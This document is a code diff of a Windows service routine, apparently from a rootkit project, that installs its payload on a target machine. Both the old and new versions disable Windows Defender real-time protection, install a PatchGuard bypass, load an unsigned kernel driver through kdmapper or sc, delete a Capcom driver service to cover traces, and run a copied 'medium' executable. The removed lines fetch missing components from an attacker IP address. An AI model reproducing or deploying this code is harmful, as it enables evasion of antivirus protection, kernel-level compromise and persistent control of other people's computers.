@@ -14,215 +14,69 @@ DWORD WINAPI ServiceMainThread(LPVOID lpParam);  // main thread, actually activa
 
 DWORD WINAPI ServiceMainThread(LPVOID lpParam)
 {
-    std::wstring NondGuardPath(GetCurrentPath() + L"\\GuardMon.sys");  // Used for if default not existing
-    RETURN_LAST LastError = { 0, ERROR_SUCCESS };
+    RETURN_LAST LastErrorSpecial = { 0, 0 };
     LogFile InitLog = { 0 };
     struct stat CheckExists = { 0 };
-    char MediumName[MAX_PATH] = { 0 };
-    
-    HANDLE TempFile = INVALID_HANDLE_VALUE;
+    char MediumName[MAX_PATH] = { 0 };    
     HANDLE MediumFile = INVALID_HANDLE_VALUE;
-    HANDLE SafeHandle = INVALID_HANDLE_VALUE;
-
+    HANDLE TempFile = INVALID_HANDLE_VALUE;
     PVOID MediumBuffer = NULL;
-    PVOID SafeBuffer = NULL;
     DWORD MediumSize = 0;
     DWORD MediumRead = 0;
     DWORD MediumWritten = 0;
-    DWORD SafeSize = 0;
+    int LastError = 0;
 
-    BOOL GotIp = FALSE;
-    BOOL GotMedium = FALSE;
-    BOOL GotMapper = FALSE;
-    BOOL GotGuard = FALSE;
-    BOOL DriverExists = TRUE;
-    
-    char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
-    char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
     char TempPath[MAX_PATH] = { 0 };
     char RandMedium[MAX_PATH] = { 0 };
-    char GuardCommand[] = "sc create GuardMon type= kernel binPath= ~";
-    char ExistingCommand[500] = { 0 };
-    char CurrentPath[500] = { 0 };
-    char GuardPath[500] = { 0 };
-    WcharpToCharp(CurrentPath, GetCurrentPath().c_str());
-    WcharpToCharp(CurrentPath, NondGuardPath.c_str());
-
-    const char* DeleteExisting = "if exist * rmdir /s /q *";
     const char* CleaningCommands =
         "cd \"%ProgramFiles%\\Windows Defender\" && "
         "MpCmdRun.exe - Restore - All && "
-        "sc stop Capcom && "
-        "sc delete Capcom && "
-        "del %windir%\\Capcom.sys";
-    const char* AttackAddresses = "172.25.112.1~172.31.240.1~172.23.144.1~172.23.224.1~172.26.192.1~172.17.160.1~172.27.144.1~192.168.47.1~192.168.5.1~192.168.1.21~172.28.224.1~192.168.56.1";
-
+        "sc stop Capcom && "  // REPLACE WITH KDMAPPER USED SERVICE IN LOADING
+        "sc delete Capcom && "  // REPLACE WITH KDMAPPER USED SERVICE IN LOADING
+        "del %windir%\\Capcom.sys";  // REPLACE WITH KDMAPPER USED SERVICE IN LOADING
+    const char* AttackAddresses = "172.18.144.1~172.19.144.1~172.30.48.1~172.23.32.1~172.17.160.1~172.21.0.1~172.24.112.1~192.168.47.1~192.168.5.1~192.168.1.21~172.20.48.1~192.168.56.1";
     
+    
+    // Make sure that all depended-on files exist on target machine (folders + files) -
+    LastError = VerfifyDepDirs();
+    if (LastError != 0) {
+        return LastError;
+    }
+    LastError = VerfifyDepFiles();
+    if (LastError != 0) {
+        return LastError;
+    }
+
+
     // Enable active log file -
-    LastError.LastError = InitLog.InitiateFile("C:\\nosusfolder\\verysus\\ServiceLog.txt");
-    if (LastError.LastError != 0) {
+    LastError = (int)InitLog.InitiateFile("C:\\nosusfolder\\verysus\\ServiceLog.txt");
+    if (LastError != 0) {
         return FALSE;
     }
 
 
     // Disable Realtime Protection -
-    LastError = RealTime(TRUE, &InitLog);
-    if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
+    LastErrorSpecial = RealTime(TRUE, &InitLog);
+    if (LastErrorSpecial.Represent != ERROR_SUCCESS || LastErrorSpecial.LastError != 0) {
         return FALSE;
     }
 
 
     // Disable patchguard -
-    if (stat("C:\\nosusfolder\\verysus\\GuardMon.sys", &CheckExists) != 0) {
-        InitLog.WriteLog((PVOID)"[i] Default guardmon didnt exist!\n", 35);
-        if (!GotIp) {
-            if (!GetAddresses(TargetIp, AttackerIp, AttackAddresses)) {
-                return SpecialQuit(0, "[-] Failed to get IP addresses of target and attacker for guardmon - ", NULL, 0, &InitLog);
-            }
-            GotIp = TRUE;
-        }
-
-        if (!FailSafe('K', AttackerIp, TargetIp, &SafeHandle, &SafeSize)) {
-            return SpecialQuit(0, "[-] FailSafe of guardmon failed - ", NULL, 0, &InitLog);
-        }
-
-        SafeBuffer = malloc(SafeSize);
-        if (SafeBuffer == NULL) {
-            CloseHandle(SafeHandle);
-            InitLog.CloseLog();
-            return FALSE;
-        }
-
-        if (!AfterFailSafe(SafeHandle, SafeSize, SafeBuffer, "GuardMon.sys")) {
-            return SpecialQuit(0, "[-] AfterFailSafe for guardmon failed - ", NULL, 0, &InitLog);
-        }
+    if (system("C:\\nosusfolder\\verysus\\meowguard\\install.bat") == -1) {
+        return SpecialQuit(GetLastError(), "[-] Installing patchguard bypass (meowguard) failed - ", NULL, 0, &InitLog);
     }
-    else {
-        GotGuard = TRUE;
+    InitLog.WriteLog((PVOID)"[+] Installed patchguard bypass (meowguard) successfully!\n", 59);
+
+
+    // Activate kdmapper with driver as parameter -
+    system("sc stop KmdfDriver");
+    system("sc delete KmdfDriver");
+    if (system("sc create KmdfDriver type= kernel binPath= \"C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys\" && sc start KmdfDriver") == -1){
+    //if (system("C:\\nosusfolder\\verysus\\kdmapper.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys") == -1) {
+        return SpecialQuit(GetLastError(), "[-] Failed to activate service manager with driver as parameter - ", NULL, 0, &InitLog);
     }
-    InitLog.WriteLog((PVOID)"[+] Got guardmon!\n", 19);
-    if (stat("C:\\nosusfolder\\verysus\\DrvLoader.exe", &CheckExists) != 0) {
-        InitLog.WriteLog((PVOID)"[i] Default drvloader didnt exist!\n", 36);
-        if (!GotIp) {
-            if (!GetAddresses(TargetIp, AttackerIp, AttackAddresses)) {
-                return SpecialQuit(0, "[-] Failed to get IP addresses of target and attacker for drvloader - ", NULL, 0, &InitLog);
-            }
-            GotIp = TRUE;
-        }
-
-        if (!FailSafe('L', AttackerIp, TargetIp, &SafeHandle, &SafeSize)) {
-            return SpecialQuit(0, "[-] FailSafe of drvloader failed - ", NULL, 0, &InitLog);
-        }
-        SafeBuffer = malloc(SafeSize);
-        if (SafeBuffer == NULL) {
-            CloseHandle(SafeHandle);
-            InitLog.CloseLog();
-            return FALSE;
-        }
-
-        if (!AfterFailSafe(SafeHandle, SafeSize, SafeBuffer, "DrvLoader.exe")) {
-            return SpecialQuit(0, "[-] AfterFailSafe for drvloader failed - ", NULL, 0, &InitLog);
-        }
-        
-        if (GotGuard) {
-            InitLog.WriteLog((PVOID)"[i] Executing command DrvLoader.exe C:\\nosusfolder\\verysus\\GuardMon.sys..\n", 75);
-            LastError.LastError = system("DrvLoader.exe C:\\nosusfolder\\verysus\\GuardMon.sys");
-        }
-        else {
-            InitLog.WriteLog((PVOID)"[i] Executing command DrvLoader.exe GuardMon.sys..\n", 52);
-            LastError.LastError = system("DrvLoader.exe GuardMon.sys");
-        }
-    }
-    else {
-        if (GotGuard) {
-            InitLog.WriteLog((PVOID)"[i] Executing command C:\\nosusfolder\\verysus\\DrvLoader.exe C:\\nosusfolder\\verysus\\GuardMon.sys..\n", 98);
-            LastError.LastError = system("C:\\nosusfolder\\verysus\\DrvLoader.exe C:\\nosusfolder\\verysus\\GuardMon.sys");
-        }
-        else {
-            InitLog.WriteLog((PVOID)"[i] Executing command C:\\nosusfolder\\verysus\\DrvLoader.exe GuardMon.sys..\n", 75);
-            LastError.LastError = system("C:\\nosusfolder\\verysus\\DrvLoader.exe GuardMon.sys");
-        }
-    }
-    if (LastError.LastError == -1) {
-        return SpecialQuit(GetLastError(), "[-] Loading GuardMon.sys with DrvLoader.exe failed - ", NULL, 0, &InitLog);
-    }
-    InitLog.WriteLog((PVOID)"[+] Loaded GuardMon.sys with DrvLoader.exe successfully!\n", 58);
-
-
-    // Make sure calling command is syntaxed correctly and that driver is available -
-    if (stat("C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys", &CheckExists) != 0) {
-        if (!GetAddresses(TargetIp, AttackerIp, AttackAddresses)) {
-            InitLog.CloseLog();
-            return SpecialQuit(0, "[-] Failed to get IP addresses of target and attacker for driver - ", NULL, 0, &InitLog);
-        }
-        GotIp = TRUE;
-
-        if (!FailSafe('D', AttackerIp, TargetIp, &SafeHandle, &SafeSize)) {
-            return SpecialQuit(0, "[-] FailSafe of driver failed - ", NULL, 0, &InitLog);
-        }
-
-        SafeBuffer = malloc(SafeSize);
-        if (SafeBuffer == NULL) {
-            CloseHandle(SafeHandle);
-            InitLog.CloseLog();
-            return FALSE;
-        }
-
-        if (!AfterFailSafe(SafeHandle, SafeSize, SafeBuffer, "KMDFdriver.sys")) {
-            return SpecialQuit(0, "[-] After FailSafe of driver failed - ", NULL, 0, &InitLog);
-        }
-        DriverExists = FALSE;
-    }
-    InitLog.WriteLog((PVOID)"[+] Made sure that medium file exists!\n", 40);
-
-
-    // Make sure calling command is syntaxed correctly and that drvmap.exe is available -
-    if (stat("C:\\nosusfolder\\verysus\\drvmap.exe", &CheckExists) != 0) {
-        if (!GotIp) {
-            if (!GetAddresses(TargetIp, AttackerIp, AttackAddresses)) {
-                return SpecialQuit(0, "[-] Failed to get IP addresses of target and attacker for mapper - ", NULL, 0, &InitLog);
-            }
-            GotIp = TRUE;
-        }
-
-        if (!FailSafe('P', AttackerIp, TargetIp, &SafeHandle, &SafeSize)) {
-            return SpecialQuit(0, "[-] FailSafe of mapper failed - ", NULL, 0, &InitLog);
-        }
-
-        SafeBuffer = malloc(SafeSize);
-        if (SafeBuffer == NULL) {
-            CloseHandle(SafeHandle);
-            InitLog.CloseLog();
-            return FALSE;
-        }
-
-        if (!AfterFailSafe(SafeHandle, SafeSize, SafeBuffer, "drvmap.exe")) {
-            return SpecialQuit(0, "[-] AfterFailSafe for mapper failed - ", NULL, 0, &InitLog);
-        }
-
-        if (!DriverExists) {
-            LastError.LastError = system("drvmap.exe KMDFdriver.sys");
-        }
-        else {
-            LastError.LastError = system("drvmap.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys");
-        }
-    }
-    else {
-        if (!DriverExists) {
-            LastError.LastError = system("C:\\nosusfolder\\verysus\\drvmap.exe KMDFdriver.sys");
-        }
-        else {
-            LastError.LastError = system("C:\\nosusfolder\\verysus\\drvmap.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys");
-        }
-    }
-    InitLog.WriteLog((PVOID)"[+] Made sure that mapper file exists!\n", 40);
-
-
-    // Activate drvmap with driver as parameter -
-    if (LastError.LastError == -1) {
-        return SpecialQuit(GetLastError(), "[-] Failed to activate drvmap.exe with driver as parameter - ", NULL, 0, &InitLog);
-    }
-    InitLog.WriteLog((PVOID)"[+] Activated drvmap.exe with driver as a parameter!\n", 54);
+    InitLog.WriteLog((PVOID)"[+] Activated service manager with driver as a parameter!\n", 59);
     
     
     // Perform cleaning commands -
@@ -233,70 +87,61 @@ DWORD WINAPI ServiceMainThread(LPVOID lpParam)
 
 
     // Enable Realtime Protection -
-    LastError = RealTime(FALSE, &InitLog);
-    if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
+    LastErrorSpecial = RealTime(FALSE, &InitLog);
+    if (LastErrorSpecial.Represent != ERROR_SUCCESS || LastErrorSpecial.LastError != 0) {
         return FALSE;
     }
 
 
-    // Get medium data -
+    // Get medium handle -
     MediumFile = CreateFileA("C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (MediumFile == INVALID_HANDLE_VALUE) {
-        if (stat("C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe", &CheckExists) == 0) {
-            return SpecialQuit(GetLastError(), "[-] Error while trying to read default medium - ", NULL, 0, &InitLog);
-        }
-        InitLog.WriteLog((PVOID)"[i] Default medium file does not exist on target!\n", 51);
-
-        if (!GotIp) {
-            if (!GetAddresses(TargetIp, AttackerIp, AttackAddresses)) {
-                return SpecialQuit(0, "[-] Error while trying to get IP addresses of attacker and target for medium - ", NULL, 0, &InitLog);
-            }
-            GotIp = TRUE;
-        }
-
-        if (!FailSafe('M', AttackerIp, TargetIp, &SafeHandle, &SafeSize)) {
-            return SpecialQuit(0, "[-] Failed to execute FailSafe for medium - ", NULL, 0, &InitLog);
-        }
-        InitLog.WriteLog((PVOID)"[i] FailSafe for medium succeeded!\n", 36);
-
-        SafeBuffer = malloc(SafeSize);
-        if (SafeBuffer == NULL) {
-            CloseHandle(SafeHandle);
-            InitLog.CloseLog();
-            return FALSE;
-        }
-
-        if (!AfterFailSafe(SafeHandle, SafeSize, SafeBuffer, "MainMedium.exe")) {
-            return SpecialQuit(0, "[-] Failed to execute AfterFailSafe for medium - ", NULL, 0, &InitLog);
-        }
-        InitLog.WriteLog((PVOID)"[i] AfterFailSafe for medium succeeded!\n", 41);
-
-        GotMedium = TRUE;
-        MediumBuffer = SafeBuffer;
-        MediumSize = SafeSize;
+        return SpecialQuit(GetLastError(), "[-] Error while trying to read default medium - ", NULL, 0, &InitLog);
     }
     InitLog.WriteLog((PVOID)"[+] Got medium file handle!\n", 36);
 
-    if (!GotMedium) {
-        MediumSize = GetFileSize(MediumFile, NULL);
-        if (MediumSize == 0) {
-            HANDLE CloseArr[1] = { MediumFile };
-            return SpecialQuit(GetLastError(), "[-] Failed to get size of medium for creating temp copy - ", CloseArr, 1, &InitLog);
-        }
-        MediumBuffer = malloc(MediumSize);
-        if (MediumBuffer == NULL) {
-            HANDLE CloseArr[1] = {MediumFile};
-            return SpecialQuit(GetLastError(), "[-] Failed to allocate memory for medium for creating temp copy - ", CloseArr, 1, &InitLog);
+
+    // Get medium data to create a temporary medium file (C:\Windows\Temp) -
+    MediumSize = GetFileSize(MediumFile, NULL);
+    if (MediumSize == 0) {
+        HANDLE CloseArr[1] = { MediumFile };
+        return SpecialQuit(GetLastError(), "[-] Failed to get size of medium for creating temp copy - ", CloseArr, 1, &InitLog);
+    }
+    MediumBuffer = malloc(MediumSize);
+    if (MediumBuffer == NULL) {
+        HANDLE CloseArr[1] = { MediumFile };
+        return SpecialQuit(GetLastError(), "[-] Failed to allocate memory for medium for creating temp copy - ", CloseArr, 1, &InitLog);
+    }
+    if (!ReadFile(MediumFile, MediumBuffer, MediumSize, &MediumRead, NULL) || MediumRead != MediumSize) {
+        HANDLE CloseArr[1] = { MediumFile };
+        free(MediumBuffer);
+        return SpecialQuit(GetLastError(), "[-] Failed to read medium data into buffer - ", CloseArr, 1, &InitLog);
+    }
+    CloseHandle(MediumFile);
+    InitLog.WriteLog((PVOID)"[+] Got medium data in buffer!\n", 32);
+
+
+    // Stop and delete existing instance of medium if theres one WITH THE SAME NAME (temp copy of medium) -
+    if (stat(TempPath, &CheckExists) == 0) {
+        InitLog.WriteLog((PVOID)"[i] Temp copy of medium with the same name already exists!\n", 60);
+        GetServiceName(TempPath, MediumName);
+        REPLACEMENT Rep = { MediumName, '*', 1 };
+        REPLACEMENT RepArr[1] = { Rep };
+        LastError = (int)ExecuteSystem("taskkill /IM * /F", RepArr, 1);
+        if (LastError != 0) {
+            free(MediumBuffer);
+            return SpecialQuit(LastError, "[-] Failed to stop existing temp copy of medium - ", NULL, 0, &InitLog);
         }
 
-        if (!ReadFile(MediumFile, MediumBuffer, MediumSize, &MediumRead, NULL) || MediumRead != MediumSize) {
-            HANDLE CloseArr[1] = { MediumFile };
+        Rep = { TempPath, '*', 2 };
+        RepArr[0] = Rep;
+        LastError = (int)ExecuteSystem("if exist * del /s /q *", RepArr, 1);
+        if (LastError != 0) {
             free(MediumBuffer);
-            return SpecialQuit(GetLastError(), "[-] Failed to read medium data into buffer - ", CloseArr, 1, &InitLog);
+            return SpecialQuit(LastError, "[-] Failed to delete existing medium temp copy - ", NULL, 0, &InitLog);
         }
-        CloseHandle(MediumFile);
+        InitLog.WriteLog((PVOID)"[i] Killed and deleted already existing temp medium copy with the same name as the current!\n", 93);
     }
-    InitLog.WriteLog((PVOID)"[+] Got medium data in buffer!\n", 32);
 
 
     // Get path to temp copy of medium file -
@@ -308,35 +153,14 @@ DWORD WINAPI ServiceMainThread(LPVOID lpParam)
     memcpy((PVOID)((ULONG64)TempPath + strlen(TempPath)), RandMedium, strlen(RandMedium) + 1);
 
 
-    // Stop and delete existing instance of medium if theres one (temp copy of medium) -
-    if (stat(TempPath, &CheckExists) == 0) {
-        InitLog.WriteLog((PVOID)"[i] Temp copy of medium with the same name already exists!\n", 60);
-        GetServiceName(TempPath, MediumName);
-        REPLACEMENT Rep = { MediumName, '*', 1 };
-        REPLACEMENT RepArr[1] = { Rep };
-        LastError.LastError = ExecuteSystem("taskkill /IM * /F", RepArr, 1);
-        if (LastError.LastError != 0) {
-            free(MediumBuffer);
-            return SpecialQuit(LastError.LastError, "[-] Failed to stop existing temp copy of medium - ", NULL, 0, &InitLog);
-        }
-
-        Rep = { TempPath, '*', 2 };
-        RepArr[0] = Rep;
-        LastError.LastError = ExecuteSystem("if exist * del /s /q *", RepArr, 1);
-        if (LastError.LastError != 0) {
-            free(MediumBuffer);
-            return SpecialQuit(LastError.LastError, "[-] Failed to delete existing medium temp copy - ", NULL, 0, &InitLog);
-        }
-        InitLog.WriteLog((PVOID)"[i] Killed and deleted already existing temp medium copy with the same name as the current!\n", 93);
-    }
-
-
-    // Stop already running medium, remove source file, create new temp medium instance -
+    // Make sure that all existing components stop working -
     if (!DeletePrevious(TempPath, &InitLog)) {
-        return SpecialQuit(GetLastError(), "[-] DeletePrevious medium failed - ", NULL, 0, &InitLog);
+        return SpecialQuit(GetLastError(), "[-] DeletePrevious failed - ", NULL, 0, &InitLog);
     }
     InitLog.WriteLog((PVOID)"[+] DeletePrevious succeeded!\n", 31);
 
+
+    // Create new temp medium instance -
     TempFile = CreateFileA(TempPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (TempFile == INVALID_HANDLE_VALUE) {
         free(MediumBuffer);
@@ -353,7 +177,7 @@ DWORD WINAPI ServiceMainThread(LPVOID lpParam)
 
 
     // Activate medium -
-    HINSTANCE MediumProcess = ShellExecuteA(NULL, "open", TempPath, NULL, NULL, SW_HIDE);
+    HINSTANCE MediumProcess = ShellExecuteA(NULL, "open", TempPath, NULL, NULL, SW_NORMAL);
     if ((INT_PTR)MediumProcess > 32) {
         InitLog.WriteLog((PVOID)"[+] Ran medium, overall success!\n", 34);
         InitLog.CloseLog();
